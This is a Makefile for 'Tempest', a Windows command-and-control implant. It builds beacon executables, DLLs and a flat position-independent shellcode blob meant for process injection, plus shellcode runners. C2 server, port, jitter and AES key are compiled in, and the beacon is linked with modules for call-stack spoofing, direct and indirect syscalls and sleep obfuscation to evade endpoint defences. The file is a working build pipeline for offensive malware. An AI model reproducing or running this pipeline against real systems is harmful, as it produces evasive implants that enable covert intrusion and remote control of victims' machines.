# Tempest Windows C implant — multi-format: PE exe/DLL and true flat shellcode.
# Stargate (T2005) in ./stargate/; BM-T6001 Morpheus in ./stargate/morpheus/ (PE sleep);
# BM-T6003 Mosaic in ./stargate/mosaic/ (PIC sleep). Vendored — must not reference
# ../../techniques/; that tree is not shipped with the repo.
# Cross-build: MinGW x86_64 (Linux host).
# C2 console trace: default on. Silence: `make ... CPPFLAGS=-DTEMPEST_C2_TRACE=0` (CPPFLAGS is passed to gcc).
#
# C2 crypto: `include/tempest_bootstrap.h` is generated from the environment variable AES_KEY
# (set by Anvil on startup, or passed through by `build_imp`). No hand-editing; run `make` on a
# host where `echo "$AES_KEY" | wc -c` is 44 (43 chars + newline) after Anvil is running.
#
# Local / CLI builds (no GUI): pass C2 and crypto the same way Anvil does — e.g.
#   export AES_KEY='<43-char url-safe key>'
#   make exe SERVER=192.168.1.24 PORT=443 SLEEP=3 JITTER=10 UUID='<uuid>'
# SERVER/PORT/SLEEP/JITTER/UUID become -DTS_* embedded in both beacon.exe and beacon.bin (PIC).
#
# Targets:
#   make / make exe   → beacon.exe
#   make dll          → beacon.dll
#   make raw          → beacon.bin  (E9 jmp @ offset 0 + flat merged `.text`; inject at base+0)
#   make runner       → tools/shellcode_runner.exe (maps beacon.bin; default entry offset 0)
#   make runner-embedded → tools/shellcode_embedded_runner.exe (beacon.bin baked in; single file)
#   make all          → exe + dll + raw + runner
#
# Raw beacon.bin — BM-PA1001 PIC pipeline + Tempest full payload:
#   mingw-gcc -nostdlib … -e shellcode_entry -Wl,-T,shellcode.ld -Wl,--no-seh
#   → beacon_sc.exe → objcopy -O binary (see raw target).
# PA1002–PA1005 cover DLL / reflective / proxy / multi-entry PE layouts; this artifact is the
# PA1001-style flat blob consumable by injection tools (e.g. BM-T4001 Early Bird, hollow_rs).

CC       := x86_64-w64-mingw32-gcc
OBJCOPY  := x86_64-w64-mingw32-objcopy
OBJDUMP  := x86_64-w64-mingw32-objdump
STARG    := stargate

.DEFAULT_GOAL := exe

CFLAGS   := -Wall -Wextra -O2 -std=c11 -D_WIN32_WINNT=0x0601
CFLAGS   += -Wno-cast-function-type -Wno-array-bounds
MORPHEUS_DIR := $(STARG)/morpheus
MOSAIC_DIR   := $(STARG)/mosaic
CFLAGS   += -I$(STARG) -I src -Iinclude -I$(MORPHEUS_DIR) -I$(MOSAIC_DIR)
MORPHEUS := $(MORPHEUS_DIR)/morpheus.c $(MORPHEUS_DIR)/morpheus_syscalls.s
MOSAIC   := $(MOSAIC_DIR)/bm_pic_deferral_mosaic.c

ifdef SERVER
  CFLAGS += -DTS_SERVER=\"$(SERVER)\"
endif
ifdef PORT
  CFLAGS += -DTS_PORT=\"$(PORT)\"
endif
ifdef SLEEP
  CFLAGS += -DTS_SLEEP=\"$(SLEEP)\"
endif
ifdef JITTER
  CFLAGS += -DTS_JITTER=\"$(JITTER)\"
endif
ifdef UUID
  CFLAGS += -DTS_UUID=\"$(UUID)\"
endif

SPOOF_C  := $(STARG)/bm_spoof.c
SPOOF_S  := $(STARG)/bm_spoof_asm.s
SG_C     := $(STARG)/stargate.c $(STARG)/moonwalk.c $(STARG)/sig_extract.c \
            $(STARG)/loader.c $(STARG)/syscalls.c $(STARG)/indirect_syscalls.c
SG_S     := $(STARG)/syscalls_asm.s $(STARG)/indirect_syscalls_asm.s

CORE     := src/beacon_core.c
PIC      := src/pic_stubs.c src/pic_heap.c src/pic_fmt.c
ENTRY_SC := src/entry_sc.c
DEPS     := $(CORE) $(SPOOF_C) $(SG_C) $(SPOOF_S) $(SG_S)
C2C      := src/tempest_c2.c
BOOT     := include/tempest_bootstrap.h
HDRS     := $(STARG)/stargate.h $(STARG)/bm_spoof.h $(MORPHEUS_DIR)/morpheus.h \
            $(MOSAIC_DIR)/bm_pic_deferral_mosaic.h $(MOSAIC_DIR)/bm_t6003_hashes.h \
            src/beacon_core.h include/tempest_c2.h include/tempest_pic_compat.h

LDFLAGS_COMMON := -lntdll
# C2 uses LoadLibraryA + EAT resolution for winhttp/bcrypt — not linked here (smaller IAT).
LDFLAGS_C2     :=
# Default 1MB stack is tight with WinHTTP/BCrypt frames; large task buffers live in .bss now.
LDFLAGS_STACK := -Wl,--stack,4194304
LDFLAGS_DLL    := -shared $(LDFLAGS_COMMON) $(LDFLAGS_C2) $(LDFLAGS_STACK)

# PIC / flat binary — PA1001-style flags + Tempest freelibs (pic_*); .idata discarded by shellcode.ld.
# PIC_C2_TRACE=1 → OutputDebugStringA "[tempest c2] …" (use DebugView); default 0 (silent like prod).
PIC_C2_TRACE ?= 0
PIC_CPPFLAGS := -DTEMPEST_PIC_SHELLCODE=1 -DTEMPEST_C2_TRACE=$(PIC_C2_TRACE)
PIC_CFLAGS   := $(PIC_CPPFLAGS) -nostdlib -ffreestanding -fno-stack-protector \
                -fno-asynchronous-unwind-tables -fno-ident -fno-pic -fno-plt -fno-common \
                -fvisibility=hidden -fno-jump-tables -mno-stack-arg-probe
PIC_LDFLAGS  :=

# Output names must appear before PIC_LDX — immediate := expands $(OUT_SCPE) when PIC_LDX is defined.
OUT_EXE        := beacon.exe
OUT_DLL        := beacon.dll
OUT_RAW        := beacon.bin
OUT_SCPE       := beacon_sc.exe
OUT_RUNNER     := tools/shellcode_runner.exe
OUT_EMB_RUNNER := tools/shellcode_embedded_runner.exe
GEN_EMBED      := tools/gen_embedded_payload.c

PIC_LDX        := -Wl,-T,shellcode.ld -Wl,--no-seh -Wl,-s -Wl,-e,shellcode_entry \
                 -Wl,--disable-runtime-pseudo-reloc -Wl,--disable-auto-import

.PHONY: all exe dll raw runner runner-embedded clean FORCE

all: exe dll raw runner

exe: $(OUT_EXE)
dll: $(OUT_DLL)
raw: $(OUT_RAW)
runner: $(OUT_RUNNER)

# Shellcode bytes + entry offset compiled into the PE (requires beacon.bin from `make raw`).
runner-embedded: $(OUT_RAW) tools/shellcode_embedded_runner.c
	@mkdir -p tools
	xxd -i $(OUT_RAW) > $(GEN_EMBED)
	@$(CC) -Wall -O2 -std=c11 -D_WIN32_WINNT=0x0601 \
	   tools/shellcode_embedded_runner.c $(GEN_EMBED) -o $(OUT_EMB_RUNNER) -mconsole
	@echo "[+] $(OUT_EMB_RUNNER): embedded beacon.bin (trampoline @0), entry +0x0"

# Always regenerate so a changed AES_KEY in the environment is picked up (e.g. new aes_key.bin).
$(BOOT): FORCE
	@mkdir -p include
	@test -n "$$AES_KEY" || (echo "win-stargate: AES_KEY is not set. Start Anvil (it sets AES_KEY from aes_key.bin), then build, or: export AES_KEY to the 43-char URL-safe key from the server log." >&2; exit 1)
	@{ \
	  printf '/* generated by Makefile from environment AES_KEY — do not commit */\n'; \
	  printf '#ifndef TEMPEST_BOOTSTRAP_H\n#define TEMPEST_BOOTSTRAP_H\n#define TEMPEST_AES_KEY_B64 "'; \
	  printf %s "$$AES_KEY"; \
	  printf '"\n#endif\n'; \
	} > $@

$(OUT_EXE): src/entry_exe.c $(DEPS) $(MORPHEUS) $(C2C) $(HDRS) $(BOOT)
	$(CC) $(CPPFLAGS) $(CFLAGS) -mconsole src/entry_exe.c $(DEPS) $(MORPHEUS) $(C2C) -o $@ $(LDFLAGS_COMMON) $(LDFLAGS_C2) $(LDFLAGS_STACK)

$(OUT_DLL): src/entry_dll.c $(DEPS) $(MORPHEUS) $(C2C) exports_beacon.def $(HDRS) $(BOOT)
	$(CC) $(CPPFLAGS) $(CFLAGS) -shared src/entry_dll.c $(DEPS) $(MORPHEUS) $(C2C) exports_beacon.def -o $@ $(LDFLAGS_DLL)

# Intermediate PE — full beacon + PIC freelibs; objcopy strips non-.text/.data/.rdata (see shellcode.ld).
# PIC sleep is BM-T6003 Mosaic (not Morpheus — direct syscall stubs from the blob hang under inject).
$(OUT_SCPE): $(ENTRY_SC) $(DEPS) $(PIC) $(MOSAIC) $(C2C) $(HDRS) $(BOOT) shellcode.ld
	$(CC) $(CPPFLAGS) $(CFLAGS) $(PIC_CFLAGS) $(ENTRY_SC) $(DEPS) $(PIC) $(MOSAIC) $(C2C) \
		-o $@ $(PIC_LDFLAGS) $(PIC_LDX)

$(OUT_RAW): $(OUT_SCPE)
	$(OBJCOPY) -O binary -j .text $(OUT_SCPE) $@
	@ls -l $@
	@file $@
	@echo "[+] $(OUT_RAW): PIC flat .text (jmp @0 to shellcode_entry; map at any base)"

$(OUT_RUNNER): tools/shellcode_runner.c
	@mkdir -p tools
	$(CC) -Wall -O2 -std=c11 -D_WIN32_WINNT=0x0601 tools/shellcode_runner.c -o $@ -mconsole

clean:
	rm -f $(OUT_EXE) $(OUT_DLL) $(OUT_RAW) $(OUT_RAW).flat $(OUT_RAW).jmp $(OUT_SCPE) $(OUT_RUNNER) $(OUT_EMB_RUNNER) $(GEN_EMBED) beacon_code.bin *.o
	rm -f $(BOOT)
